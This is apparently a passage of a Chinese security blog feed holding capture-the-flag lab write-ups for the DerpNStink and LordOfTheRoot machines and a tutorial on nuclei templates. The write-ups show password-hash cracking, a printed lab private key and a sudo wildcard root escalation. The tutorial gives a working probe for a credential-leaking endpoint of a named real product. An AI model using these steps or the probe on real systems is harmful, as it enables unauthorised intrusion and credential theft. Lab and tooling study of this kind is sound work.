class="line">和hash加密过后的密码</span><br></pre></td></tr></table></figure><br>$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">写进1.txt中，用john打</span><br></pre></td></tr></table></figure><br>echo ‘$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41’ &gt; 1.txt<br>john 1.txt —wordlist=/usr/share/wordlists/rockyou.txt<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~~rockyou.txt可能是还是gz形态，如果出现了/usr/share/wordlists/rockyou.txt: No such file or directory，过去解压就好~~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">理论是能解开的，我直接拿wp的了</span><br><span class="line">unclestinky/wedgie57</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>┌──(kali㉿kali)-[~]<br>└─$ john 1.txt —wordlist=/usr/share/wordlists/rockyou.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 6 OpenMP threads<br>Press ‘q’ or Ctrl-C to abort, almost any other key for status<br>wedgie57         (?)<br>1g 0:00:02:37 DONE (2024-07-22 18:31) 0.006347g/s 17749p/s 17749c/s 17749C/s wedner12..wed61299<br>Use the “—show —format=phpass” options to display all of the cracked passwords reliably<br>Session completed.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">事实上确实解开了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在home里面发现两个账号密码，</span><br></pre></td></tr></table></figure><br>www-data@DeRPnStiNK:/home$ ls<br>ls<br>mrderp  stinky</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh登不上，用21的ftp试了试，stinky/wedgie57可以</span><br><span class="line"></span><br><span class="line">ftp登陆成功，在files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/里面有一个key.txt，</span><br><span class="line">get下载下下来发现是密钥，用ssh登录</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>┌──(kali㉿kali)-[~]<br>└─$ ssh -i key.txt stinky@192.168.159.136<br>Ubuntu 14.04.5 LTS</p><pre><code>                   ,~~~~~~~~~~~~~..                   &#39;  Derrrrrp  N  `    ,~~~~~~,       |    Stink      |    / ,      \      &#39;,  ________ _,&quot;  /,~|_______\.      \/ /~ (__________)   (*)  ; (^)(^)&#39;:    =;  ____  ;      ; &quot;&quot;&quot;&quot;  ;=</code></pre><p>   {“}<em>   ‘ ‘“”‘ ‘ </em>{“}<br>   _<em>/     &gt;  &lt;   _</em>/<br>      \    ,”   “,  /<br>       \  “       /“<br>          “      “=</p><pre><code>       &gt;     &lt;      =&quot;     &quot;-      -`.   ,&#39;            -        `--&#39;</code></pre><p>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>Permissions 0664 for ‘key.txt’ are too open.<br>It is required that your private key files are NOT accessible by others.<br>This private key will be ignored.<br>Load key “key.txt”: bad permissions<br>stinky@192.168.159.136: Permission denied (publickey).</p><p>┌──(kali㉿kali)-[~]<br>└─$ chmod 600<br>chmod: “600” 后缺少操作对象<br>请尝试执行 “chmod —help” 来获取更多信息。</p><p>┌──(kali㉿kali)-[~]<br>└─$ chmod 600 key.txt</p><p>┌──(kali㉿kali)-[~]<br>└─$ ssh -i key.txt stinky@192.168.159.136<br>Ubuntu 14.04.5 LTS</p><pre><code>                   ,~~~~~~~~~~~~~..                   &#39;  Derrrrrp  N  `    ,~~~~~~,       |    Stink      |    / ,      \      &#39;,  ________ _,&quot;  /,~|_______\.      \/ /~ (__________)   (*)  ; (^)(^)&#39;:    =;  ____  ;      ; &quot;&quot;&quot;&quot;  ;=</code></pre><p>   {“}<em>   ‘ ‘“”‘ ‘ </em>{“}<br>   _<em>/     &gt;  &lt;   _</em>/<br>      \    ,”   “,  /<br>       \  “       /“<br>          “      “=</p><pre><code>       &gt;     &lt;      =&quot;     &quot;-      -`.   ,&#39;            -        `--&#39;</code></pre><p>sign_and_send_pubkey: no mutual signature supported<br>stinky@192.168.159.136: Permission denied (publickey).</p><p>┌──(kali㉿kali)-[~]<br>└─$ ssh -i key.txt stinky@192.168.159.136<br>Ubuntu 14.04.5 LTS</p><pre><code>                   ,~~~~~~~~~~~~~..                   &#39;  Derrrrrp  N  `    ,~~~~~~,       |    Stink      |    / ,      \      &#39;,  ________ _,&quot;  /,~|_______\.      \/ /~ (__________)   (*)  ; (^)(^)&#39;:    =;  ____  ;      ; &quot;&quot;&quot;&quot;  ;=</code></pre><p>   {“}<em>   ‘ ‘“”‘ ‘ </em>{“}<br>   _<em>/     &gt;  &lt;   _</em>/<br>      \    ,”   “,  /<br>       \  “       /“<br>          “      “=</p><pre><code>       &gt;     &lt;      =&quot;     &quot;-      -`.   ,&#39;            -        `--&#39;</code></pre><p>sign_and_send_pubkey: no mutual signature supported<br>stinky@192.168.159.136: Permission denied (publickey).</p><p>┌──(kali㉿kali)-[~]<br>└─$ cat key.txt<br>——-BEGIN RSA PRIVATE KEY——-<br>MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4<br>2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO<br>uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn<br>AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f<br>5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB<br>LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc<br>nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD<br>D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4<br>ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk<br>Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq<br>YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0<br>DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X<br>VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu<br>Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7<br>VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc<br>fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br<br>7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab<br>L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q<br>cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8<br>gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7<br>RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1<br>14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W<br>pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz<br>UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA<br>a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o<br>——-END RSA PRIVATE KEY——-</p><p>┌──(kali㉿kali)-[~]<br>└─$ ssh -i key.txt stinky@192.168.159.136 -o PubkeyAcceptedKeyTypes=+ssh-rsa<br>Ubuntu 14.04.5 LTS</p><pre><code>                   ,~~~~~~~~~~~~~..                   &#39;  Derrrrrp  N  `    ,~~~~~~,       |    Stink      |    / ,      \      &#39;,  ________ _,&quot;  /,~|_______\.      \/ /~ (__________)   (*)  ; (^)(^)&#39;:    =;  ____  ;      ; &quot;&quot;&quot;&quot;  ;=</code></pre><p>   {“}<em>   ‘ ‘“”‘ ‘ </em>{“}<br>   _<em>/     &gt;  &lt;   _</em>/<br>      \    ,”   “,  /<br>       \  “       /“<br>          “      “=</p><pre><code>       &gt;     &lt;      =&quot;     &quot;-      -`.   ,&#39;            -        `--&#39;</code></pre><p>Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)</p><ul><li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li></ul><p>331 packages can be updated.<br>231 updates are security updates.</p><p>Last login: Fri Jan 28 02:40:43 2022 from 192.168.4.55<br>stinky@DeRPnStiNK:~$<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次提示权限不够，然后chmod 600给权限，第二次说权限太开放</span><br><span class="line"></span><br><span class="line">~~所以是封闭还是开饭到底，怒~~</span><br><span class="line"></span><br><span class="line">在后面加</span><br><span class="line">-o PubkeyAcceptedKeyTypes=+ssh-rsa</span><br></pre></td></tr></table></figure><br>stinky@DeRPnStiNK:~$ ls<br>Desktop  Documents  Downloads  ftp<br>stinky@DeRPnStiNK:~$ pwd<br>/home/stinky<br>stinky@DeRPnStiNK:~$ cd /home/stinky<br>stinky@DeRPnStiNK:~$ ls<br>Desktop  Documents  Downloads  ftp<br>stinky@DeRPnStiNK:~$ cd Desktop/<br>stinky@DeRPnStiNK:~/Desktop$ ls<br>flag.txt<br>stinky@DeRPnStiNK:~/Desktop$ cat f*<br>flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)<br>stinky@DeRPnStiNK:~/Desktop$<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">之前在ftp的时候,network-logs目录下还有一个文件，中有一段对话，提示说修改密码的时候，进行了抓包</span><br><span class="line"></span><br><span class="line">（忘了截图了，就直接拿wp的）</span><br><span class="line"></span><br><span class="line">https://i-blog.csdnimg.cn/blog_migrate/d8f33c1bf0d19f6c77ee22d6d45adc0e.png</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>──(kali㉿kali)-[~]<br>└─$ scp -i key.txt -o PubkeyAcceptedKeyTypes=+ssh-rsa  stinky@192.168.159.136:/home/stinky/Documents/derpissues.pcap /home/kali<br>Ubuntu 14.04.5 LTS</p><pre><code>                   ,~~~~~~~~~~~~~..                   &#39;  Derrrrrp  N  `    ,~~~~~~,       |    Stink      |    / ,      \      &#39;,  ________ _,&quot;  /,~|_______\.      \/ /~ (__________)   (*)  ; (^)(^)&#39;:    =;  ____  ;      ; &quot;&quot;&quot;&quot;  ;=</code></pre><p>   {“}<em>   ‘ ‘“”‘ ‘ </em>{“}<br>   _<em>/     &gt;  &lt;   _</em>/<br>      \    ,”   “,  /<br>       \  “       /“<br>          “      “=</p><pre><code>       &gt;     &lt;      =&quot;     &quot;-      -`.   ,&#39;            -        `--&#39;</code></pre><p>derpissues.pcap                                             100% 4289KB  25.9MB/s   00:00    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">用scp下载下来</span><br><span class="line"></span><br><span class="line">wirkshark打开</span><br><span class="line">[![pk74ZMd.png](https://s21.ax1x.com/2024/07/22/pk74ZMd.png)](https://imgse.com/i/pk74ZMd)</span><br><span class="line"></span><br><span class="line">发现password</span><br><span class="line"></span><br><span class="line">ssh登录mrderp/derpderpderpderpderpderpderp</span><br><span class="line"></span><br><span class="line">Home文件夹下有一个helpdesk.logh，里面提示了</span><br><span class="line">要去https://pastebin.com/RzK9WfGw</span><br><span class="line"></span><br><span class="line">然后就简单了</span><br><span class="line"></span><br><span class="line">照着提示走访问https://pastebin.com/RzK9WfGw</span><br><span class="line"></span><br><span class="line">[![pk74JMj.png](https://s21.ax1x.com/2024/07/22/pk74JMj.png)](https://imgse.com/i/pk74JMj)</span><br><span class="line"></span><br><span class="line">获得mrderp ALL=(ALL) /home/mrderp/binaries/derpy提示</span><br><span class="line"></span><br><span class="line">这是考查的一个linux sudo命令知识点，</span><br><span class="line"></span><br><span class="line">大概意思：</span><br><span class="line"></span><br><span class="line">允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/</span><br><span class="line">目录下derpy开头的文件</span><br><span class="line"></span><br><span class="line">sudo -l 看权限</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mrderp@DeRPnStiNK:~$ sudo -l<br>[sudo] password for mrderp:<br>Matching Defaults entries for mrderp on DeRPnStiNK:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</p><p>User mrderp may run the following commands on DeRPnStiNK:<br>    (ALL) /home/mrderp/binaries/derpy*<br>mrderp@DeRPnStiNK:~$ cd /home/mrderp<br>mrderp@DeRPnStiNK:~$ mkdir binaries<br>mkdir: cannot create directory ‘binaries’: File exists<br>mrderp@DeRPnStiNK:~$ ls<br>binaries  Desktop  Documents  Downloads<br>mrderp@DeRPnStiNK:~$ cd binaries/<br>mrderp@DeRPnStiNK:~/binaries$ ls<br>dayu.sh  derpy.sh<br>mrderp@DeRPnStiNK:~/binaries$ echo ‘/bin/bash’ &gt; derpy.sh<br>mrderp@DeRPnStiNK:~/binaries$ chmod 777 derpy.sh<br>mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh<br>root@DeRPnStiNK:~/binaries# ls<br>dayu.sh  derpy.sh<br>root@DeRPnStiNK:~/binaries# cd /root/Desktop<br>root@DeRPnStiNK:/root/Desktop# ls<br>flag.txt<br>root@DeRPnStiNK:/root/Desktop# cat flag.txt<br>flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)</p><p>Congrats on rooting my first VulnOS!</p><p>Hit me up on twitter and let me know your thoughts!</p><p>@securekomodo</p><p>root@DeRPnStiNK:/root/Desktop#<br>```</p><p>至此，<del>已称艺术</del>  完结撒靶机</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Derpnstink-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nuclei</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8830%E6%97%A5-nuclei%E4%BD%BF%E7%94%A8%E8%B0%83%E7%A0%94/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8830%E6%97%A5-nuclei%E4%BD%BF%E7%94%A8%E8%B0%83%E7%A0%94/</url>
      
        <content type="html"><![CDATA[<h1 id="nuclei调研"><a href="#nuclei调研" class="headerlink" title="nuclei调研"></a>nuclei调研</h1><p>前几天浅浅看了两眼yamly和nuclei，这次就看一下yaml语言写的nuclei</p><h2 id="nuclei连接云端"><a href="#nuclei连接云端" class="headerlink" title="nuclei连接云端"></a>nuclei连接云端</h2><p>nuclei提供了一个云端的页面</p><p><a href="https://cloud.projectdiscovery.io/">https://cloud.projectdiscovery.io/</a></p><p>进去以后登录，我是直接使用的github登录的，然后复制api key</p><p>在本地Nuclei中输入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -auth</span><br></pre></td></tr></table></figure></p><p>以后扫描后面带个<code>-cloud-upload</code>就中</p><h3 id="nuclei模板学习"><a href="#nuclei模板学习" class="headerlink" title="nuclei模板学习"></a>nuclei模板学习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">id: lianai-admin-info-poc</span><br><span class="line"></span><br><span class="line">info:</span><br><span class="line">  name: 脸爱云一脸通智慧管理平台管理用户信息泄露漏洞 # 漏洞名称</span><br><span class="line">  author: Andy # 作者</span><br><span class="line">  severity: high # 漏洞危害等级 info、low、medium、high、critical</span><br><span class="line">  tags: 敏感信息泄露 # 模板标签列表，多个用,分割，可以写漏洞类型若漏洞有CVE编号，可以加上cve及 敏感信息泄露,cve</span><br><span class="line">  description: 脸爱云一脸通智慧管理平台存在信息泄露漏洞，该漏洞源于SystemMng.ashx接口处存在信息泄露漏洞，攻击者能够利用该漏洞通过SelOperators参数泄露的当前管理员的敏感信息包括账号密码登录系统后台。</span><br><span class="line">http:</span><br><span class="line">    - method: POST</span><br><span class="line">      path:</span><br><span class="line">        - &quot;&#123;&#123;BaseURL&#125;&#125;/SystemMng.ashx&quot;</span><br><span class="line">      headers:</span><br><span class="line">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54</span><br><span class="line">        X-Requested-With: XMLHttpRequest</span><br><span class="line">        Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">      body:</span><br><span class="line">        &quot;username=admin&amp;funcName=SelOperators&quot;</span><br><span class="line">      matchers-condition: and # 规则验证方法 and&amp;or</span><br><span class="line">      matchers:</span><br><span class="line">        - type: word</span><br><span class="line">          part: body # 指定检查位置 body响应体，header响应头，status_code状态码</span><br><span class="line">          words:</span><br><span class="line">            - 超级管理员</span><br><span class="line">        - type: status</span><br><span class="line">          status:</span><br><span class="line">            - 200</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一个脸爱云的用户信息泄露漏洞的poc,是使用yaml也就是nuclei模板编写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id： 编写的脚本名字</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">info：</span><br><span class="line">  name     漏洞名称</span><br><span class="line">  author   作者，你给自己起一个名字就行</span><br><span class="line">  severity  漏洞等级，分为info,low,high,critical，表示信息，低，高，严重</span><br><span class="line">  tags       模板标签列表，多个用,分割，可以写漏洞类型若漏洞有CVE编号，可以加上cve及 敏感信息泄露,cve</span><br><span class="line">  description  形容一下这个漏洞，比如上面的脸爱云就简单分析了一下这个漏洞</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">    - method: 请求方法,GET或者POST</span><br><span class="line">      path:</span><br><span class="line">        - &quot;&#123;&#123;BaseURL&#125;&#125;/SystemMng.ashx&quot;  请求路径，</span><br><span class="line">      headers:    </span><br><span class="line">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54</span><br><span class="line">        X-Requested-With: XMLHttpRequest</span><br><span class="line">        Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">      body:</span><br><span class="line">        &quot;username=admin&amp;funcName=SelOperators&quot;</span><br><span class="line">      matchers-condition: and # 规则验证方法 and&amp;or，and表示所有匹配条件都要满足，</span><br><span class="line">      matchers:</span><br><span class="line">        - type: word   检查类型是word</span><br><span class="line">          part: body # 指定检查位置 body响应体，header响应头，status_code状态码</span><br><span class="line">          words:</span><br><span class="line">            - 超级管理员    需要检查的词</span><br><span class="line">        - type: status   </span><br><span class="line">          status:</span><br><span class="line">            - 200</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matchers：体验证方法，下面的每个type为一次验证，</span><br><span class="line">type支持status：对响应状态代码进行整数比较,</span><br><span class="line">size：比较响应的内容长度，word：基于响应的特定部分进行文本比较，</span><br><span class="line">dsl:DSL（领域特定语言）在响应的特定部分进行高级匹配；</span><br><span class="line">当选择word时，需指定part，words为关键字，支持多个关键字，他们之间的关系为并列关系。</span><br></pre></td></tr></table></figure><p>这是一个简单的信息泄露</p><p>nuclei在这个界面支持自定义编写</p><p><a href="https://cloud.projectdiscovery.io/templates">编写的界面</a></p><p><a href="https://docs.projectdiscovery.io/api-reference/scans/get-scan-list">自研界面</a></p><p>使用nuclei的话一般都是直接-u  但是nuclei要指定模板进行扫描<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -u  地址  -t 模板   （-p  代理）  -cloud-upload</span><br></pre></td></tr></table></figure><br>当然它还有很多的模板供参考，可以看一下template文件</p><p>剩下的信息nuclei官方文档写的满清楚了，我就不多叙述了</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nuclei </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LordOfTheRoot_1.0.1</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8830%E6%97%A5-6-LordOfTheRoot-1-0-1/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8830%E6%97%A5-6-LordOfTheRoot-1-0-1/</url>
      
        <content type="html"><![CDATA[<p>6-LordOfTheRoot_1.0.1</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>经典nmap扫描但是这个很奇怪只开放了22端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sn 192.168.159.0/24   </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:06 CST</span><br><span class="line">Nmap scan report for 192.168.159.1</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.2</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:E1:64:0A (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.135</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">MAC Address: 00:0C:29:65:E0:CF (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.254</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 00:50:56:E3:A8:9B (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.129</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 3.97 seconds</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -A -p- 192.168.159.135 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:06 CST</span><br><span class="line">Nmap scan report for 192.168.159.135</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)</span><br><span class="line">|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)</span><br><span class="line">|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)</span><br><span class="line">|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:65:E0:CF (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (89%), Linux 3.13 - 3.16 (87%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.62 ms 192.168.159.135</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 114.67 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用ssh链接一下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 